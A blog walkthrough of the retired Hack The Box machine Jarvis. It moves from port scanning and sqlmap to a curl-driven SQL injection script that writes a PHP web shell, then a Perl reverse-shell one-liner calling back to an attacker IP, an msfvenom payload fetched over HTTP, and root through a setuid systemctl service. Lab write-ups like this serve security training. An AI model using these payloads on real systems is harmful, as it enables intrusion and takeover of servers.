---
layout: post
title: "Jarvis: Hack The Box Walkthrough"
date: 2019-11-10 03:54:38 +0000
last_modified_at: 2019-11-10 03:54:38 +0000
category: Walkthrough
tags: ["Hack The Box", Jarvis, retired]
comments: true
image:
  feature: jarvis-htb-walkthrough.jpg
  credit: JasonPinaster / Pixabay
  creditlink: https://pixabay.com/photos/courthouse-311-jarvis-st-toronto-1061123/
---

This post documents the complete walkthrough of Jarvis, a retired vulnerable [VM][1] created by [manulqwerty][2] and [Ghostpp7][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Jarvis is retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.143 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-23 07:52:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.143
Discovered open port 64999/tcp on 10.10.10.143
Discovered open port 80/tcp on 10.10.10.143
```

Port `64999/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,64999 -A --reason -oN nmap.txt 10.10.10.143
...
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

Stark Hotel? I'm sensing an Iron-Man theme here. :laughing: It appears that `64999/tcp` is also a `http` service. Here's how both of them looks like.

_80/tcp_

<a class="image-popup">
![900ac137.png](/assets/images/posts/jarvis-htb-walkthrough/900ac137.png)
</a>

_64999/tcp_

<a class="image-popup">
![835a70ee.png](/assets/images/posts/jarvis-htb-walkthrough/835a70ee.png)
</a>

Hmm. Some kind of anti-bruteforce mechanism is in place.

### SQL Injection in `cod`

It wasn't long before I found a page that may possibly be susceptible to SQL injection.

<a class="image-popup">
![26bafacb.png](/assets/images/posts/jarvis-htb-walkthrough/26bafacb.png)
</a>

I made a guess—the database could be MySQL.

```
# sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --dbms=mysql --batch
```

Bingo!

<a class="image-popup">
![6d8f2a7d.png](/assets/images/posts/jarvis-htb-walkthrough/6d8f2a7d.png)
</a>

Armed with that insight, I could write/inject a PHP file to `/images` directory of the Apache default installation. This directory is almost certain to be writable by `www-data`. The PHP file is simple.

~~~~php
<?php echo shell_exec($_GET[0]); ?>
~~~~

Towards that end, I wrote a `bash` injector of sorts using `curl` as the main driver.

<div class="filename"><span>room</span></div>

~~~~bash
#!/bin/bash

HOST=supersecurehotel.htb
ROOM="room.php?cod="
COOKIE=$(mktemp -u)

if [ -z "$1" ]; then
  SQLI=$(urlencode "-1 UNION ALL SELECT 1,2,'<?php echo shell_exec(\$_GET[0]); ?>',4,5,6,7 INTO OUTFILE '/var/www/html/images/cmd.php'-- qwerty")
else
  SQLI=$(urlencode "-1 UNION ALL SELECT 1,2,$1,4,5,6,7-- qwerty")
fi

curl -s \
     -c $COOKIE \
     -o /dev/null \
     http://$HOST/

curl -s \
     -b $COOKIE \
     "http://$HOST/${ROOM}${SQLI}" \
| sed -r '/<span class="price-room">/,/<\/span>/!d' \
| sed -r -e 's/\s+<span class="price-room">//' -e '$d' \
| sed -r 's/<\/span>//'

# clean up
rm -f $COOKIE
~~~~

Running the script without argument creates `cmd.php` in `/images`.

<a class="image-popup">
![f2c794ca.png](/assets/images/posts/jarvis-htb-walkthrough/f2c794ca.png)
</a>

## Low-Privilege Shell

Having `cmd.php` is as good as getting a shell. Let\'s run a Perl one-liner reverse shell back to me, like so:

```
perl -e 'use Socket;$i="10.10.14.163";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Bam.

<a class="image-popup">
![91071a5b.png](/assets/images/posts/jarvis-htb-walkthrough/91071a5b.png)
</a>

## Privilege Escalation

During enumeration of `www-data`\'s account, I noted that `www-data` is able to `sudo` as `pepper` to run a Python script.

<a class="image-popup">
![e3c8db1e.png](/assets/images/posts/jarvis-htb-walkthrough/e3c8db1e.png)
</a>

### Getting `user.txt`

Check out the function `exec_ping()` in `simpler.py`.

<a class="image-popup">
![8ac6dfe4.png](/assets/images/posts/jarvis-htb-walkthrough/8ac6dfe4.png)
</a>

We can easily bypass the filter and get ourselves a shell as `pepper`. First, we create a reverse shell with `msfvenom`.

<a class="image-popup">
![73c35f66.png](/assets/images/posts/jarvis-htb-walkthrough/73c35f66.png)
</a>

Next, we host the reverse shell with Python's SimpleHTTPServer module.

```
# python -m SimpleHTTPServer 80
```

Finally, let\'s download the file.

<a class="image-popup">
![324934ad.png](/assets/images/posts/jarvis-htb-walkthrough/324934ad.png)
</a>

We need to `chmod` the file to be executable as well. I\'ll leave that as an exercise. Once that\'s done, we can run the reverse shell over to us.

<a class="image-popup">
![62b3a175.png](/assets/images/posts/jarvis-htb-walkthrough/62b3a175.png)
</a>

On our `nc` listener, a reverse shell appears...

<a class="image-popup">
![8ab63511.png](/assets/images/posts/jarvis-htb-walkthrough/8ab63511.png)
</a>

`user.txt` is at `pepper`\'s home directory.

<a class="image-popup">
![b37fb682.png](/assets/images/posts/jarvis-htb-walkthrough/b37fb682.png)
</a>

### Getting `root.txt`

During enumeration of `pepper`\'s account, I noted a `setuid` `systemctl` executable where the group `pepper` has the right to execute it.

<a class="image-popup">
![9aafd008.png](/assets/images/posts/jarvis-htb-walkthrough/9aafd008.png)
</a>

This executable is associated with controlling `systemd` services. I guess I have to create my own service. :triumph:

<a class="image-popup">
![32d86c64.png](/assets/images/posts/jarvis-htb-walkthrough/32d86c64.png)
</a>

Next, symlink `/etc/systemd/system/aaa.service` to `/tmp/aaa.service`.

<a class="image-popup">
![ac0c4c8d.png](/assets/images/posts/jarvis-htb-walkthrough/ac0c4c8d.png)
</a>

Start the service `systemctl start aaa` and profit!

<a class="image-popup">
![0f797379.png](/assets/images/posts/jarvis-htb-walkthrough/0f797379.png)
</a>

Sweet. Retrieving `root.txt` is trivial with a `root` shell.

<a class="image-popup">
![0c3b83b8.png](/assets/images/posts/jarvis-htb-walkthrough/0c3b83b8.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/194
[2]: https://www.hackthebox.eu/home/users/profile/25205
[3]: https://www.hackthebox.eu/home/users/profile/24844
[4]: https://www.hackthebox.eu/
